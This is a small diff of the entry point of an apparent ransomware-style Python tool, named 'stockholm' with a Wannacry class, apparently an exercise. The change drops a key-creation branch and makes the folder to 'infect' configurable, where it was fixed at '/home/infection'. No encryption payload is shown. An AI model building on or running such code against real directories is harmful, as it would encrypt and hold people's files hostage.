@@ -9,10 +9,7 @@ load_dotenv()  # take environment variables from .env.
 def main():
     args = optparsing()
     os.environ['STOCKHOLM_IS_SILENT'] = str(args.silent)
-    infect_path = '/home/infection'
-    if args.key:
-        Wannacry(is_create=True)
-        exit(0)
+    infect_path = args.path if args.path else '/home/infection'
     if args.reverse:
         wannacry = Wannacry()
         if not wannacry.fernet:
